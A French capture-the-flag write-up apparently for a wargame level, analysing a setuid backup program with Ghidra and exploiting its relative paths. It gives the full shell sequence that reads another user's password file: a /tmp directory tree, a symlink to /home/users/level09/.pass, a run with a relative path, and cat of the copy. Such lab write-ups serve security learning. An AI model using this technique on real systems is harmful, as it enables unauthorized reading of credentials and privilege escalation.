# Level08

### Repérage

```
ls -la
-rwsr-s---+ 1 level09 users 12975 Oct 19 2016 level08

ls -la backups/
drwxrwx---+ 1 level09 users  100 backups
-rwxrwx---+ 1 level09 users   32 .log
```

Le programme est un outil de backup : `./level08 <fichier>`. Il copie le fichier donné en argument dans `./backups/`.
Les copies sont créées en 0660, donc seront lisibles par moi.

### Analyse Ghidra

main fait, dans l'ordre :

```
fopen("./backups/.log", "w")                // 1. ouvre le log
log_wrapper(log, "Starting back up:", av[1])
fopen(av[1], "r")                           // 2. ouvre le fichier SOURCE
strncpy(dst, "./backups/")                  // 3. construit la destination
strncat(dst, av[1], ...)                    //    dst = "./backups/" + av[1]
open(dst, O_WRONLY|O_CREAT|O_EXCL, 0660)    // 4. crée la copie
while (fgetc(source)) write(copie)          // 5. recopie octet par octet
```

Si l'un des open/fopen échoue, le programme exit.

### La faille : chemins relatifs + lecture privilégiée

Deux points se combinent :
- le fichier SOURCE (av[1]) est lu avec les droits de level09 (setuid)
- tous les chemins (.log, destination) sont RELATIFS au répertoire courant (cwd)

Comme les chemins sont relatifs, on peut lancer le programme depuis un répertoire qu'on contrôle (/tmp) et recréer autour de lui l'arborescence dont il a besoin.

L'objectif : faire lire /home/users/level09/.pass par level09, et récupérer la copie qu'il en fait

### Les blocages rencontrés

1) `./level08 /home/users/level09/.pass` (chemin absolu)
```
ERROR: Failed to open ./backups//home/users/level09/.pass
```
La SOURCE est bien lue (level09 y a droit), mais la DESTINATION "./backups/" + "/home/users/level09/.pass" = "./backups//home/users/level09/.pass" n'existe pas (dossiers intermédiaires absents) -> open() échoue.

2) Lancer depuis /tmp sans backups/ :
```
ERROR: Failed to open ./backups/.log
```
Le .log utilise un chemin relatif. Depuis /tmp il cherche /tmp/backups/.log -> absent. Il faut donc créer /tmp/backups/.

3) Je ne peux pas écrire dans mon home (dr-xr-x--- pas de w) ni dans ~/backups directement. -> on travaille entièrement dans /tmp.

### L'exploit : recréer l'arborescence dans /tmp

Idée : on passe un chemin RELATIF en argument, et on reconstruit dans /tmp les deux arbres dont le programme a besoin :
- l'arbre SOURCE : un symlink vers le vrai .pass, pour que fopen(av[1]) le lise
- l'arbre DESTINATION : les dossiers vides sous backups/, pour que open() réussisse

En passant av[1] = `home/users/level09/.pass` (relatif, sans / au début) :
- source : fopen("home/users/level09/.pass") -> /tmp/home/users/level09/.pass
           -> suit notre symlink -> vrai .pass -> lu par level09
- dest   : open("./backups/home/users/level09/.pass") -> /tmp/backups/home/users/level09/.pass
           -> le dossier existe (on l'a créé) -> copie créée

```
cd /tmp

# arbre SOURCE : symlink vers le vrai pass
mkdir -p /tmp/home/users/level09
ln -s /home/users/level09/.pass /tmp/home/users/level09/.pass

# arbre DESTINATION : dossiers vides sous backups/ (+ backups/ pour le .log)
mkdir -p /tmp/backups/home/users/level09

# lancer avec le chemin RELATIF
~/level08 home/users/level09/.pass

# lire la copie
cat /tmp/backups/home/users/level09/.pass
```

Le programme (euid level09) suit le symlink, lit le vrai .pass, et en écrit une copie dans /tmp/backups/... en 0660 level09:users. Comme je suis dans le groupe users, je peux lire cette copie.
